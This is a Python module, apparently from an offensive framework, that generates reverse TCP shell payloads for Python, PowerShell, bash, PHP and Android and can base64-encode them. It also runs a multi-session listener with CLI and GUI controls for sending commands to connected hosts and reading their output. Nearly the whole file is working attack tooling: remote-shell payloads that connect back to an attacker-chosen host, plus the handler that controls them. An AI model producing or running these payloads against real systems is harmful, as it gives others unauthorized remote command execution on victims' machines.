#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Reverse TCP Payload Generator + Multi-Handler
Supports: Python, Windows, Linux, Android, PHP, Bash
Built-in multi-session handler with GUI & CLI support
Thread-safe GUI updates using QTimer.singleShot
"""
import socket
import threading
import os
import base64
import time
import sys
import select
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

# === GUI SUPPORT (Thread-safe) ===
try:
    from PyQt6.QtCore import QMetaObject, Qt, QTimer
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

console = Console()

# === MODULE INFO ===
MODULE_INFO = {
    "name": "Reverse TCP Multi-Handler",
    "author": "LazyFramework Team",
    "description": "Generate reverse TCP payloads & handle multiple sessions. GUI + CLI.",
    "rank": "Excellent",
    "platform": "Multi",
    "arch": "Multi",
    "license": "MIT"
}

OPTIONS = {
    "LHOST": {"description": "Listener IP", "default": "0.0.0.0", "required": True},
    "LPORT": {"description": "Listener port", "default": 4444, "required": True},
    "PAYLOAD": {"description": "python, windows, linux, php, bash, android", "default": "python", "required": True},
    "OUTPUT": {"description": "Save payload to file", "default": "", "required": False},
    "ENCODE": {"description": "Encode with base64 [yes/no]", "default": "no", "required": False}
}

# === GLOBAL SESSION STORAGE (CLI + GUI) ===
SESSIONS = {}
SESSION_LOCK = threading.Lock()

# === PAYLOAD GENERATOR (FIXED: FULL INTERACTIVE) ===
def generate_payload(lhost, lport, payload_type):
    payloads = {
        "python": f'''import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
while True:
    try:
        data = s.recv(1024).decode(errors='ignore').strip()
        if not data or data.lower() == "exit": break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        output = stdout + stderr
        if output: s.send(output + b"\\n")
        else: s.send(b"\\n")
    except Exception as e:
        break
s.close()''',

        "windows": f'''powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();while($true){{$data = $stream.Read((New-Object Byte[] 1024),0,1024);if($data.Length -eq 0){{break}}$cmd = [Text.Encoding]::UTF8.GetString($data).Trim();if($cmd -eq 'exit'){{break}}$output = iex $cmd 2>&1 | Out-String;$sendback = [Text.Encoding]::UTF8.GetBytes($output);$stream.Write($sendback,0,$sendback.Length)}};$client.Close()"''',

        "linux": f"""bash -c 'exec 5<>/dev/tcp/{lhost}/{lport}; while read line <&5; do eval "$line" 2>&1 | tee >&5; done'""",

        "bash": f"""bash -c 'exec 5<>/dev/tcp/{lhost}/{lport}; while read line <&5; do eval "$line" 2>&1 | tee >&5; done'""",

        "php": f"""<?php
set_time_limit(0);
$ip = '{lhost}'; $port = {lport};
$sock = fsockopen($ip, $port);
while ($sock) {{
    $cmd = fgets($sock);
    if (!$cmd) break;
    $output = shell_exec(trim($cmd));
    fwrite($sock, $output);
}}
fclose($sock);
?>""",

        "android": f'''import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
while True:
    try:
        data = s.recv(1024).decode(errors='ignore').strip()
        if not data or data == "exit": break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.communicate()[0] + proc.communicate()[1]
        s.send(output + b"\\n")
    except: break
s.close()'''
    }
    return payloads.get(payload_type.lower(), "").strip()

# === SEND COMMAND FUNCTION (for GUI) ===
def send_session_command(session_id, command):
    """Send command to specific session (untuk GUI)"""
    if session_id not in SESSIONS:
        return False
    with SESSION_LOCK:
        SESSIONS[session_id]['pending_cmd'] = command.strip()
    return True

# === IMPROVED HANDLER (FIXED: FULL DUPLEX) ===
def handler(client_sock, addr, framework_session):
    sess_id = f"{addr[0]}_{int(time.time() * 1000) % 100000}"

    session_data = {
        'socket': client_sock,
        'ip': addr[0],
        'port': addr[1],
        'type': 'reverse_tcp',
        'output': '',
        'created': time.strftime("%H:%M:%S"),
        'status': 'alive',
        'pending_cmd': None
    }

    # Add to global SESSIONS
    with SESSION_LOCK:
        SESSIONS[sess_id] = session_data

    # GUI Integration
    gui_sessions = framework_session.get('gui_sessions')
    gui_instance = framework_session.get('gui_instance')
    if gui_sessions:
        with gui_sessions['lock']:
            gui_sessions['dict'][sess_id] = session_data
        if GUI_AVAILABLE and gui_instance:
            QTimer.singleShot(0, gui_instance.update_sessions_ui)

    console.print(f"[bold green][+] Session {sess_id} opened from {addr}[/]")

    try:
        client_sock.settimeout(1.0)
        buffer = ""

        while True:
            # === KIRIM COMMAND DARI GUI ===
            cmd = session_data.get('pending_cmd')
            if cmd:
                try:
                    client_sock.send((cmd + "\n").encode())
                    with SESSION_LOCK:
                        SESSIONS[sess_id]['pending_cmd'] = None
                except:
                    break

            # === TERIMA OUTPUT DARI TARGET ===
            try:
                ready = select.select([client_sock], [], [], 0.1)
                if ready[0]:
                    data = client_sock.recv(4096)
                    if not data:
                        break
                    decoded = data.decode('utf-8', errors='ignore')
                    buffer += decoded

                    # Proses baris lengkap
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        line = line.rstrip()
                        if line:
                            # Simpan output
                            with SESSION_LOCK:
                                if sess_id in SESSIONS:
                                    SESSIONS[sess_id]['output'] += line + "\n"
                            # Update GUI
                            if GUI_AVAILABLE and gui_instance:
                                QTimer.singleShot(0, lambda l=line: gui_instance.append_output(f"[session:{sess_id}] {l}"))
            except socket.timeout:
                continue
            except:
                break

    except Exception as e:
        console.print(f"[red][!] Handler error: {e}[/]")
    finally:
        try:
            client_sock.close()
        except:
            pass

        # Cleanup
        with SESSION_LOCK:
            SESSIONS.pop(sess_id, None)
        if gui_sessions:
            with gui_sessions['lock']:
                gui_sessions['dict'].pop(sess_id, None)
            if GUI_AVAILABLE and gui_instance:
                QTimer.singleShot(0, gui_instance.update_sessions_ui)

        console.print(f"[bold red][-] Session {sess_id} closed[/]")

# === LISTENER + HANDLER ===
def start_listener(lhost, lport, framework_session):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((lhost, lport))
        server.listen(10)
        console.print(f"[bold cyan][*] Listening on {lhost}:{lport}...[/]")
        while True:
            client_sock, addr = server.accept()
            t = threading.Thread(target=handler, args=(client_sock, addr, framework_session), daemon=True)
            t.start()
    except Exception as e:
        console.print(f"[red][!] Listener error: {e}[/]")
    finally:
        server.close()

# === MAIN RUN ===
def run(session, options):
    lhost = options.get("LHOST")
    lport = int(options.get("LPORT"))
    payload_type = options.get("PAYLOAD").lower()
    output_file = options.get("OUTPUT")
    encode = options.get("ENCODE", "no").lower() == "yes"

    if payload_type not in ["python", "windows", "linux", "php", "bash", "android"]:
        console.print(f"[red][!] Invalid PAYLOAD: {payload_type}[/]")
        return

    payload = generate_payload(lhost, lport, payload_type)
    if not payload:
        console.print("[red][!] Failed to generate payload[/]")
        return

    if encode:
        payload = base64.b64encode(payload.encode()).decode()
        console.print("[yellow][*] Payload encoded with base64[/]")

    if output_file:
        ext = {"windows": ".ps1", "php": ".php", "python": ".py", "android": ".py", "bash": ".sh", "linux": ".sh"}.get(payload_type, ".txt")
        if not output_file.endswith(ext):
            output_file += ext
        try:
            with open(output_file, "w") as f:
                f.write(payload)
            console.print(f"[green][+] Payload saved: {output_file}[/]")
        except Exception as e:
            console.print(f"[red][!] Save failed: {e}[/]")

    console.print("\n[bold white]Payload:[/]")
    console.print(Panel(payload, title=payload_type.upper(), border_style="blue"))

    console.print(f"\n[bold yellow][*] Starting listener on {lhost}:{lport}...[/]")
    console.print("[dim]Sessions will appear in GUI → Sessions tab[/]")

    listener_thread = threading.Thread(target=start_listener, args=(lhost, lport, session), daemon=True)
    listener_thread.start()

    session['reverse_tcp_listener'] = listener_thread
    session['reverse_tcp_sessions'] = SESSIONS
    session['reverse_tcp_lock'] = SESSION_LOCK

    # CLI Mode
    if hasattr(sys.stdin, 'fileno') and not session.get('gui_mode', False):
        try:
            while True:
                cmd = input("lzf(sessions) > ").strip()
                if cmd == "sessions":
                    show_sessions()
                elif cmd.startswith("interact "):
                    sid = cmd.split(maxsplit=1)[1]
                    interact_session(sid)
                elif cmd.startswith("kill "):
                    sid = cmd.split(maxsplit=1)[1]
                    kill_session(sid)
                elif cmd in ["exit", "quit", "back"]:
                    break
        except (EOFError, KeyboardInterrupt):
            pass

# === CLI COMMANDS ===
def show_sessions():
    if not SESSIONS:
        console.print("[yellow][!] No active sessions[/]")
        return
    table = Table(title="Active Sessions")
    table.add_column("ID")
    table.add_column("IP")
    table.add_column("Port")
    table.add_column("Type")
    table.add_column("Created")
    for sid, s in SESSIONS.items():
        table.add_row(sid, s['ip'], str(s['port']), s['type'], s['created'])
    console.print(table)

def interact_session(sid):
    if sid not in SESSIONS:
        console.print(f"[red][!] Session {sid} not found[/]")
        return
    console.print(f"[green][*] Interacting with {sid}... (Type 'exit' to return)[/]")
    try:
        while True:
            cmd = input(f"{sid} > ").strip()
            if cmd.lower() in ["exit", "quit"]:
                break
            if not cmd: continue
            if send_session_command(sid, cmd):
                time.sleep(0.3)
                output = SESSIONS[sid]['output'].split('\n')[-10:]
                console.print('\n'.join([l for l in output if l.strip()]))
            else:
                console.print("[red]Failed to send command[/]")
    except KeyboardInterrupt:
        console.print("\n[yellow][*] Returning...[/]")

def kill_session(sid):
    if sid not in SESSIONS:
        console.print(f"[red][!] Session {sid} not found[/]")
        return
    try:
        SESSIONS[sid]['socket'].close()
        with SESSION_LOCK:
            SESSIONS.pop(sid, None)
        gui_sessions = None
        if 'framework_session' in globals():
            fs = globals()['framework_session']
            gui_sessions = fs.get('gui_sessions')
            gui_instance = fs.get('gui_instance')
        if gui_sessions and GUI_AVAILABLE and gui_instance:
            def safe_update():
                with gui_sessions['lock']:
                    gui_sessions['dict'].pop(sid, None)
                gui_instance.update_sessions_ui()
            QTimer.singleShot(0, safe_update)
        console.print(f"[green][+] Session {sid} killed[/]")
    except Exception as e:
        console.print(f"[red][!] Kill failed: {e}[/]")

# === GUI HELPERS ===
def get_active_sessions():
    with SESSION_LOCK:
        return SESSIONS.copy()

def close_session(session_id):
    kill_session(session_id)
